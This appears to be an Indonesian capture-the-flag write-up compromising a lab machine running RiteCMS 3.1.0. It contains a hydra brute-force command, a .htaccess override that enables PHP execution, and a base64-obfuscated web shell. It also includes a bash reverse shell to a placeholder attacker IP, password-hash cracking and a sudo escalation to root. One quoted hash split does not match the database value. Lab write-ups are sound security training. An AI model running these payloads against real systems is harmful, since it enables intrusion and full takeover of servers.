# Writeup: Guesser

|||
|---|---|
|**Platform**|HackTrace|
|**OS**|Linux|
|**Difficulty**|Easy|
|**IP Target**|10.1.2.147|
|**Machine Maker**|lowpassfilter|
|**Player**|greed|

---
## Ringkasan

Machine **Guesser** diawali dengan penemuan virtual host tersembunyi (`freepoint.local`) melalui pesan yang bocor di halaman default Apache, setelah proteksi HTTP Basic Auth pada port 80 dilewati menggunakan kredensial default `admin:admin`. Virtual host tersebut menjalankan **RiteCMS v3.1.0**.

Akses ke admin panel CMS didapatkan melalui brute force menggunakan `hydra`, dengan kredensial `milabo:milabo` username `milabo` diperoleh dari judul blog yang tertera di halaman utama aplikasi. Setelah masuk ke admin panel, kerentanan **Authenticated RCE** pada modul Files Manager RiteCMS 3.1.0 dieksploitasi dengan meng-override `.htaccess` untuk mem-bypass restriksi eksekusi `.php`, menghasilkan reverse shell sebagai `www-data`.

Dari dalam sistem, ditemukan database SQLite milik RiteCMS yang menyimpan hash password pengguna. Dengan membaca source code aplikasi, format hashing (`SHA1(password+salt) + salt`) berhasil dipahami, dan hash milik `milabo` divalidasi cocok dengan password yang sama seperti kredensial CMS. Password tersebut ternyata **di-reuse** sebagai password akun sistem operasi `markal`. Karena `markal` memiliki hak `sudo ALL:ALL` tanpa batasan, privilege escalation ke **root** dapat dilakukan secara langsung.

**Attack chain:** Basic Auth bypass → Virtual host discovery → Admin panel brute force → Authenticated file upload RCE (RiteCMS 3.1.0) → Credential/password reuse → Privilege escalation via unrestricted sudo.
## 1. Reconnaissance

### 1.1 Port Scanning

Scan awal dilakukan menggunakan `rustscan` yang dikombinasikan dengan `nmap` untuk service enumeration dan default script scanning:


```bash
rustscan -a 10.1.2.147 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil:**

```
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41
| http-auth:
| HTTP/1.1 401 Unauthorized
|_  Basic realm=Restricted Content
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Terdapat dua port terbuka:

- **22/tcp**  OpenSSH 8.2p1 (Ubuntu)
- **80/tcp**  Apache 2.4.41, dilindungi HTTP Basic Authentication

### 1.2 Enumerasi HTTP Basic Auth

Port 80 mengembalikan status `401 Unauthorized` dengan proteksi HTTP Basic Auth. Dicoba kredensial default `admin:admin`, dan berhasil melewati proteksi tersebut.

Setelah autentikasi berhasil, dilakukan directory brute force menggunakan `feroxbuster` dengan header `Authorization` yang di-inject secara manual (karena versi feroxbuster yang digunakan tidak mendukung flag bawaan untuk basic auth):

```bash
feroxbuster -u http://10.1.2.147/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -H "Authorization: Basic $(echo -n 'admin:admin' | base64)" \
  -t 100 -k --dont-filter \
  -x html,php,txt \
  --filter-status 404,400 \
  --redirects -o 80.txt
```

**Hasil:**

```
200      GET      361l      870w    10179c http://10.1.2.147/index.html
200      GET       15l       74w     6147c http://10.1.2.147/icons/ubuntu-logo.png
200      GET      361l      870w    10179c http://10.1.2.147/
403      GET        9l       28w      275c http://10.1.2.147/icons/
403      GET        9l       28w      275c http://10.1.2.147/server-status
```

Halaman yang muncul adalah halaman default Apache2 Ubuntu. Namun, terdapat pesan tersembunyi di dalam konten halaman tersebut:

> "Dear developers, somehow the application can be only run on Virtual Hosts, add this IP address in `/etc/hosts` as `freepoint.local`"

Pesan ini mengindikasikan adanya konfigurasi **Virtual Host** pada Apache yang hanya dapat diakses melalui `Host` header yang sesuai.

### 1.3 Virtual Host Discovery

Domain `freepoint.local` ditambahkan ke `/etc/hosts`:

```bash
echo "10.1.2.147 freepoint.local" | sudo tee -a /etc/hosts
```

Mengakses `http://freepoint.local/` menampilkan aplikasi web yang berbeda dari default page  sebuah CMS bernama **RiteCMS versi 3.1.0**, dengan judul blog "MILABO BLOG".

---

## 2. Exploitation

### 2.1 Identifikasi Vulnerability

RiteCMS versi 3.1.0 memiliki kerentanan publik berupa **Authenticated Remote Code Execution (RCE)** melalui fitur upload pada modul Files Manager, yang memungkinkan bypass restriksi eksekusi file `.php` yang secara default di-deny melalui `.htaccess` pada direktori `media`/`files`.

Referensi: _RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated)_ oleh faisalfs10x (Exploit-DB #50616).

Untuk mengeksploitasi kerentanan ini, dibutuhkan kredensial admin panel yang valid terlebih dahulu.

### 2.2 Credential Access  Admin Panel Login

Kredensial default `admin:admin` tidak valid pada admin panel RiteCMS (`admin.php`). Dilakukan analisis terhadap mekanisme login menggunakan Burp Suite untuk memahami perbedaan response saat login gagal maupun berhasil.

**Temuan:**

- Baik gagal maupun berhasil, server mengembalikan status **302 Found**.
- Perbedaan terletak pada header `Location`:
    - Gagal → `Location: ./admin.php?msg=login_failed`
    - Berhasil → redirect ke halaman dashboard tanpa parameter `msg=login_failed`

Berdasarkan temuan ini, brute force dilakukan menggunakan `hydra` dengan kondisi kegagalan berbasis string `login_failed` yang muncul pada header `Location`:


```bash
hydra -l milabo -P /usr/share/wordlists/rockyou.txt freepoint.local http-post-form \
  "/admin.php:username=^USER^&userpw=^PASS^:F=login_failed" -t 30 -f
```

Username `milabo` didapatkan sebagai indikasi dari judul blog "MILABO BLOG" yang tampil di halaman utama aplikasi.

**Hasil:** Kredensial valid ditemukan `milabo:milabo`.

### 2.3 Bypass Upload Restriction (RCE)

Setelah berhasil login ke admin panel, dilakukan eksploitasi pada modul **Files Manager** dengan langkah sebagai berikut:

**1. Menghapus `.htaccess` default** pada direktori `media`, kemudian mengunggah `.htaccess` baru dengan konfigurasi yang mengizinkan eksekusi satu file PHP tertentu:

```apache
<Files *.php>
deny from all
</Files>

<FilesMatch "(?i)also\.php$">
  Require all granted
  Allow from all
</FilesMatch>

AddType application/x-httpd-php .pHp
```

Catatan teknis:

- Directive `<Files ~ "pattern">` dari PoC publik disesuaikan menjadi `<FilesMatch>` beserta syntax `Require all granted` (Apache 2.4), agar kompatibel dengan module yang aktif di server target.
- Regex `(?i)` ditambahkan agar pencocokan nama file bersifat case-insensitive, karena file yang diupload menggunakan ekstensi `.pHp` (bypass filter case-sensitive bawaan RiteCMS).
- Directive `AddType application/x-httpd-php .pHp` diperlukan agar Apache benar-benar mengeksekusi file berekstensi `.pHp` sebagai PHP  tanpa ini, file hanya lolos dari blokir akses (403) namun tetap di-serve sebagai `text/plain`.

**2. Mengunggah web shell** dengan nama `also.pHp`:

```php
<?php system($_GET[base64_decode('Z3JlZWQ=')]);?>
```

Parameter GET disamarkan menggunakan base64 encoding (`Z3JlZWQ=` = `greed`) untuk menghindari deteksi filter/WAF berbasis signature sederhana.

**3. Verifikasi eksekusi:**

```
http://freepoint.local/media/also.pHp?greed=id
```

Web shell berhasil dieksekusi, mengonfirmasi RCE sebagai user `www-data`.

### 2.4 Mendapatkan Reverse Shell

Reverse shell dikirim melalui parameter GET yang di-encode base64, kemudian di-decode dan dieksekusi via pipe ke `bash`, untuk menghindari masalah karakter spesial (`&`, `|`, `>`) yang tidak konsisten ditangani oleh browser maupun berpotensi terdeteksi oleh WAF:

```bash
echo -n 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' | base64
```


```bash
curl -G "http://freepoint.local/media/also.pHp" \
  --data-urlencode "greed=echo <base64_payload> | base64 -d | bash"
```

Listener:


```bash
nc -lvnp <port>
```

Reverse shell interaktif berhasil didapatkan sebagai `www-data`.

---

## 3. Privilege Escalation

### 3.1 Enumerasi Filesystem Aplikasi

Eksplorasi direktori instalasi RiteCMS (`/var/www/freepoint`) menemukan database SQLite penyimpan data pengguna CMS:


```bash
sqlite3 /var/www/freepoint/data/userdata.db ".tables"
```

```
rite_userdata
```

```bash
sqlite3 /var/www/freepoint/data/userdata.db "SELECT * FROM rite_userdata;"
```

```
1|administrator|1|47949330308bf457ec486bb76b850f808fd7fce5f226389372|1692356351|1
2|milabo|1|924504d054f18f5357553910aa3dd04223fcb91f65920737cc|1785510268|0
```

### 3.2 Analisis Mekanisme Password Hashing

Untuk memahami format hash yang digunakan, dilakukan pembacaan source code RiteCMS pada file `functions.admin.inc.php`:

```php
function generate_pw_hash($pw)
 {
  $salt = random_string(10,'0123456789abcdef');
  $salted_hash = sha1($pw.$salt);
  $hash_with_salt = $salted_hash.$salt;
  return $hash_with_salt;
 }

function is_pw_correct($pw,$hash)
 {
  if(strlen($hash)==50)
   {
    $salted_hash = substr($hash,0,40);
    $salt = substr($hash,40,10);
    if(sha1($pw.$salt)==$salted_hash) return true;
    else return false;
   }
  else return false;
 }
```

Format hash yang digunakan adalah:

```
SHA1(password . salt) + salt
```

- 40 karakter pertama → SHA1 hash
- 10 karakter terakhir → salt (plaintext, ditempel di belakang hash)

### 3.3 Validasi Formula & Password Reuse

Sebagai validasi, hash milik `milabo` dipecah menjadi hash dan salt:

- Hash: `9245040540f18f5357553910aa3dd04223fcb91f`
- Salt: `65920737cc`

Diuji dengan asumsi password sama dengan username (`milabo`), sesuai pola kredensial yang telah ditemukan sebelumnya pada login admin panel:


```bash
echo -n "milabo65920737cc" | sha1sum
```

```
924504d054f18f5357553910aa3dd04223fcb91f
```

Hash yang dihasilkan **cocok** dengan hash pada database, mengonfirmasi bahwa password `milabo` di-reuse sebagai password sistem operasi untuk user yang sama.

### 3.4 Lateral Movement & Privilege Escalation

Kredensial `milabo:milabo` dicoba pada user sistem operasi `markal`:

```bash
su markal
```

Password: `milabo`

Login berhasil. Selanjutnya dilakukan pengecekan hak akses `sudo`:

```bash
sudo -l
```

```
Matching Defaults entries for markal on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User markal may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

User `markal` memiliki hak `sudo` tanpa batasan (`ALL : ALL ALL`), sehingga privilege escalation ke root dapat dilakukan secara langsung:

```bash
sudo su
```

Akses **root** berhasil didapatkan.